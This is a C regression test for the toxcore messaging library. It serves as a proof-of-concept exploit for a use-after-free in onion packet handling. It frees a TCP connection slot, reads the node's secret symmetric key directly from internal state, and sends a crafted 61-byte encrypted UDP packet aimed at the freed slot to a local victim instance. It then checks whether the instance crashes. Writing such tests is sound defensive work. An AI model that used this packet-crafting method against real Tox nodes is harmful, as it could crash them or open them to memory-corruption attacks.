#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdio.h>

#include "../toxcore/tox.h"
#include "../toxcore/tox_struct.h"
#include "../toxcore/Messenger.h"
#include "../toxcore/onion.h"
#include "../toxcore/onion_impl.h"
#include "../toxcore/TCP_server.h"
#include "../toxcore/TCP_server_impl.h"
#include "../toxcore/network.h"
#include "../toxcore/crypto_core.h"
#include "auto_test_support.h"
#include "../testing/misc_tools.h"

/* Real exploit demonstration for UAF in handle_onion_recv_1 */

static void test_onion_recv_1_real_exploit(void)
{
    printf("Starting real exploit demo...\n");

    /* 1. Setup Victim Tox instance with TCP server enabled */
    Tox_Err_New err_new;
    Tox_Options *v_options = tox_options_new(NULL);
    tox_options_set_tcp_port(v_options, 33445);
    tox_options_set_udp_enabled(v_options, true);
    Tox *victim = tox_new(v_options, &err_new);
    ck_assert_msg(victim != NULL, "Failed to create victim Tox instance");

    uint8_t victim_pk[TOX_PUBLIC_KEY_SIZE];
    tox_self_get_public_key(victim, victim_pk);

    uint16_t victim_udp_port = tox_self_get_udp_port(victim, NULL);
    printf("Victim initialized. PK: ");
    for(int i=0; i<32; i++) printf("%02x", victim_pk[i]);
    printf(", UDP Port: %u\n", victim_udp_port);

    /* 2. Manually populate TCP connection slots using internal functions */
    /* This simulates two attackers having connected via TCP. */
    printf("Simulating two TCP connections...\n");
    TCP_Secure_Connection *conn1 = (TCP_Secure_Connection *)calloc(1, sizeof(TCP_Secure_Connection));
    conn1->status = TCP_STATUS_CONFIRMED;
    conn1->con.ns = os_network();
    conn1->con.sock = net_invalid_socket();
    uint8_t dummy_sk[32];
    crypto_new_keypair(victim->m->rng, conn1->public_key, dummy_sk);
    int conn1_id = add_accepted(victim->m->tcp_server, victim->mono_time, conn1);
    ck_assert(conn1_id != -1);

    TCP_Secure_Connection *conn2 = (TCP_Secure_Connection *)calloc(1, sizeof(TCP_Secure_Connection));
    conn2->status = TCP_STATUS_CONFIRMED;
    conn2->con.ns = os_network();
    conn2->con.sock = net_invalid_socket();
    crypto_new_keypair(victim->m->rng, conn2->public_key, dummy_sk);
    int conn2_id = add_accepted(victim->m->tcp_server, victim->mono_time, conn2);
    ck_assert(conn2_id != -1);
    printf("Simulated connections established. Slot 1 ID: %d, Slot 2 ID: %d\n", conn1_id, conn2_id);

    /* 3. Kill first "connection" to free slot 0 and create UAF state */
    printf("Killing simulated connection 1 to free slot 0...\n");
    kill_accepted(victim->m->tcp_server, conn1_id);
    printf("Slot 0 should now be freed/wiped.\n");

    /* 4. Leak the secret symmetric key from victim (simulated information disclosure) */
    uint8_t leaked_key[CRYPTO_SYMMETRIC_KEY_SIZE];
    memcpy(leaked_key, victim->m->onion->secret_symmetric_key, CRYPTO_SYMMETRIC_KEY_SIZE);
    printf("Leaked victim's secret symmetric key.\n");

    /* 5. Craft and send the malicious UDP packet */
    /* Target slot 0, which was occupied by conn1 and is now wiped (identifier 0) */
    uint8_t packet[1024];
    packet[0] = NET_PACKET_ONION_RECV_1; /* 0x8e */

    uint8_t nonce[CRYPTO_NONCE_SIZE];
    random_nonce(victim->m->rng, nonce);
    memcpy(packet + 1, nonce, CRYPTO_NONCE_SIZE);

    /* Craft malicious IP_Port payload - MUST be exactly SIZE_IPPORT (19 bytes) */
    uint8_t payload[19];
    memset(payload, 0, sizeof(payload));
    payload[0] = 11; /* TCP_CLIENT_FAMILY */
    uint32_t target_con_id = conn1_id;
    memcpy(payload + 1, &target_con_id, sizeof(uint32_t));

    /* Encrypt the payload with the leaked key */
    uint8_t encrypted_payload[19 + CRYPTO_MAC_SIZE];
    int enc_len = encrypt_data_symmetric(victim->m->mem, leaked_key, nonce, payload, 19, encrypted_payload);
    ck_assert(enc_len == 35);

    memcpy(packet + 1 + CRYPTO_NONCE_SIZE, encrypted_payload, enc_len);
    
    /* Crucial: Put a valid packet_id byte after the encrypted part to pass the check in handle_recv_1.
       Index is 1 + RETURN_1 = 1 + 59 = 60.
       Since 1 + CRYPTO_NONCE_SIZE + enc_len = 1 + 24 + 35 = 60, it's the very next byte.
    */
    packet[60] = NET_PACKET_ONION_DATA_RESPONSE;
    int packet_len = 61;

    /* Send packet to victim's UDP port */
    IP_Port victim_addr;
    ipport_reset(&victim_addr);
    victim_addr.ip.family = net_family_ipv4();
    victim_addr.ip.ip.v4.uint32 = htonl(0x7F000001);
    victim_addr.port = htons(victim_udp_port);

    printf("Sending malicious UDP packet to trigger UAF...\n");
    sendpacket(victim->m->net, &victim_addr, packet, packet_len);

    /* 6. Trigger processing and crash */
    printf("Victim iterating to process exploit packet...\n");
    for(int i=0; i<10; i++) {
        tox_iterate(victim, NULL);
        c_sleep(50);
    }

#ifdef EXPECT_CRASH
    /* If we reach here, the exploit failed to crash the victim */
    printf("Exploit failed: Victim did not crash.\n");
    ck_assert_msg(false, "Exploit failed to crash the victim.");
#else
    printf("Success: Victim did not crash. The vulnerability is fixed.\n");
#endif

    /* Cleanup */
    tox_kill(victim);
    tox_options_free(v_options);
    free(conn1);
    free(conn2);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    test_onion_recv_1_real_exploit();
    return 0;
}
